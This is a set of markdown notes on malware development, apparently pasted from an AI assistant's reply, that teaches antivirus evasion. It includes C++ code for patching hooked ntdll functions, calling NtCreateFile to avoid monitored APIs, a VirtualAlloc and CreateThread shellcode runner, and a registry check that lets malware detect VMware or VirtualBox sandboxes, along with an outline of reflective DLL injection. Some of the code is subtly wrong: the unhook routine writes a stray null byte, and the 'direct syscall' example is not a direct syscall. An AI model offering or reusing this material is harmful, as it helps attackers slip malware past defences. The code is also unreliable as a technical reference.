# Index 
- [[Malware Development]]
	- [[7. Advanced Techniques]]
		- [[7.1 Code Reuse (API Unhooking and Windows Code Reuse)]]
		- [[7.2 Syscall Usage (Direct System Calls)]]
		- [[7.3 In-memory Execution (Reflective DLL Injection)]]
		- [[7.4 In-memory Execution of Shellcode (Payload Execution)]]
		- [[7.5 Reflective DLL Injection]]
		- [[7.6 Evading Dynamic Analysis (Anti-VM and Anti-Sandbox Techniques)]]

# Code Reuse (API Unhooking and Windows Code Reuse)

AV solutions often hook Windows APIs to monitor and block malicious activities. To evade this, you can:
- Unhook APIs: Some AVs monitor functions like `CreateProcess`, `WriteProcessMemory`, or `VirtualAllocEx` to detect malicious behavior. You can "unhook" these functions by either restoring the original function pointers or using alternative APIs to achieve the same goal.
  
  Steps to Implement API Unhooking:
  - Retrieve the base address of the DLL (e.g., `kernel32.dll` or `ntdll.dll`) using `GetModuleHandle`.
  - Find the original function pointer for the API function in the DLL export table.
  - Overwrite the hooked function by copying back the original bytes.
  
  Here’s a simplified example of how to restore a hooked function:

  ```cpp
  #include <windows.h>
  
  void UnhookAPI() {
      // Get handle to the NTDLL module
      HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");

      if (hNtdll) {
          // Get the address of the target function (e.g., NtCreateFile)
          void* pFunction = GetProcAddress(hNtdll, "NtCreateFile");
          
          if (pFunction) {
              // You would typically copy back the original bytes of the function here
              // which have been replaced by a hook
              // In this example, we're simplifying the restoration process.
              
              // Example: Restoring original bytes (you would need to know the original bytes)
              DWORD oldProtect;
              VirtualProtect(pFunction, 5, PAGE_EXECUTE_READWRITE, &oldProtect);
              // Restore original bytes of the function
              memcpy(pFunction, "\x4C\x8B\xD1\xB8", 5);
              VirtualProtect(pFunction, 5, oldProtect, &oldProtect);
          }
      }
  }
  ```

- Reuse Legitimate Windows Code: Instead of using APIs that AVs are likely to monitor (e.g., `CreateProcess`, `VirtualAlloc`), you can manually invoke low-level system calls (syscalls) or use code snippets from system DLLs directly. This technique can reduce your signature by making your code look like legitimate system processes.

# Syscall Usage (Direct System Calls)

By avoiding the higher-level WinAPI, which AVs can hook, you can directly invoke system calls (syscalls). Syscalls are the lowest-level interface between user-mode code and the kernel. The key advantage is that many AV solutions don’t monitor syscalls directly since they focus on API calls.

- NtCreateFile: Instead of calling `CreateFile`, which may be monitored, you can use the `NtCreateFile` syscall directly.
  
  Example:
  
  ```cpp
  #include <windows.h>

  typedef NTSTATUS (NTAPI* pNtCreateFile)(
      PHANDLE FileHandle,
      ACCESS_MASK DesiredAccess,
      POBJECT_ATTRIBUTES ObjectAttributes,
      PIO_STATUS_BLOCK IoStatusBlock,
      PLARGE_INTEGER AllocationSize,
      ULONG FileAttributes,
      ULONG ShareAccess,
      ULONG CreateDisposition,
      ULONG CreateOptions,
      PVOID EaBuffer,
      ULONG EaLength
  );
  
  void CallNtCreateFile() {
      HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
      pNtCreateFile NtCreateFile = (pNtCreateFile)GetProcAddress(ntdll, "NtCreateFile");
      
      HANDLE fileHandle;
      OBJECT_ATTRIBUTES objAttr;
      IO_STATUS_BLOCK ioStatus;
      
      // Initialize OBJECT_ATTRIBUTES and other parameters
      // Example: create a file using NtCreateFile
      
      NTSTATUS status = NtCreateFile(&fileHandle, FILE_GENERIC_WRITE, &objAttr, &ioStatus, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_CREATE, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
      
      if (status == 0) {
          // File created successfully
          CloseHandle(fileHandle);
      }
  }
  ```

Challenges: While calling syscalls directly can bypass API hooking, you must ensure compatibility with different Windows versions. The syscall numbers can change between versions, so this technique requires some version-specific code to work across Windows systems.

# In-memory Execution (Reflective DLL Injection)

Reflective DLL injection allows you to load a DLL into memory and execute it without writing it to disk. This is a common technique for avoiding disk-based AV detection.

Reflective DLL injection works by:
- Loading a DLL from memory instead of the filesystem.
- Manually resolving function imports and relocations.
- Calling the DLL’s entry point manually.

Reflective DLL injection is complex, but here’s a simplified workflow:
- Load your DLL into memory (e.g., read it from a network location or embedded resource).
- Use `VirtualAlloc` to allocate space in the target process’s memory.
- Manually map sections of the DLL (text, data, and relocation sections) into the allocated space.
- Manually resolve imports by iterating through the Import Address Table (IAT).
- Call the DLL’s entry point.

Example Project: [Reflective DLL Injection Project by Stephen Fewer](https://github.com/stephenfewer/ReflectiveDLLInjection).

# In-memory Execution of Shellcode (Payload Execution)

You can load shellcode (binary instructions) directly into memory and execute it, avoiding file system writes entirely.

Steps to Execute Shellcode in Memory:
1. Allocate memory using `VirtualAlloc` with execution permissions (`PAGE_EXECUTE_READWRITE`).
2. Copy the shellcode to the allocated memory space.
3. Use a function pointer or `CreateThread` to execute the shellcode.

Example of executing shellcode in C++:

```cpp
#include <windows.h>

void RunShellcode(unsigned char* shellcode, SIZE_T shellcodeSize) {
    // Allocate executable memory
    void* execMemory = VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    // Copy the shellcode to the allocated memory
    memcpy(execMemory, shellcode, shellcodeSize);
    
    // Create a thread to execute the shellcode
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execMemory, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
}

int main() {
    // Example shellcode (MessageBoxA call)
    unsigned char shellcode[] = {
        // Insert shellcode here
    };
    RunShellcode(shellcode, sizeof(shellcode));
    return 0;
}
```

Challenges: Executing shellcode in-memory can still trigger behavioral detection if the shellcode performs suspicious activities (e.g., network communications, privilege escalation). Anti-heuristic techniques, such as delaying execution or mimicking legitimate behavior, can help evade detection.

# Reflective DLL Injection

This advanced technique allows a DLL to be injected into a process without being written to disk. The entire DLL is loaded from memory.

The key idea is to:
- Allocate memory in the target process (using `VirtualAllocEx`).
- Write the contents of the DLL to the target process memory (using `WriteProcessMemory`).
- Manually call the entry point of the DLL (usually `DllMain`).

Challenges: Reflective DLL injection is difficult to implement but highly effective. Modifying the DLL loading process avoids detection by many AV solutions, especially those focused on file-based scanning.

# Evading Dynamic Analysis (Anti-VM and Anti-Sandbox Techniques)

AV solutions often use sandboxes and virtual machines (VMs) to execute and analyze suspicious files. To evade this, malware can detect if it’s running in a VM or sandbox environment and modify its behavior accordingly.

Techniques for Detecting VMs and Sandboxes:
- Registry Checks: Query registry keys that are specific to virtual environments (e.g., VMware or VirtualBox keys).
- Driver Checks: Look for drivers commonly used by virtual machines (e.g., `VBoxMouse.sys`, `vmci.sys`).
- MAC Address Checks: Check for known virtual NIC MAC addresses, such as `00:05:69` (VMware) or `08:00:27` (VirtualBox).
- CPU Instructions: Execute instructions like `cpuid` to check if the CPU is virtualized.

Here’s an example of checking for a VMware environment:

```cpp
#include <windows.h>

bool IsVirtualMachine() {
    HKEY hKey;
    const wchar_t* regPath = L"HARDWARE\\Description\\System\\BIOS";
    
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, regPath, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        wchar_t buffer[256];
        DWORD bufferSize = sizeof(buffer);
        if (RegQueryValueEx(hKey, L"SystemManufacturer", NULL, NULL, (LPBYTE)buffer, &bufferSize) == ERROR_SUCCESS) {
            if (wcsstr(buffer, L"VMware") || wcsstr(buffer, L"VirtualBox")) {
                RegCloseKey(hKey);
                return true;
            }
        }
        RegCloseKey(hKey);
    }


    return false;
}
```

These techniques form the core of advanced malware evasion and provide a solid foundation for understanding how attackers can bypass modern detection systems. Let me know if you would like to dive deeper into any of these methods, or if you would like practical examples or further guidance on setting up specific techniques!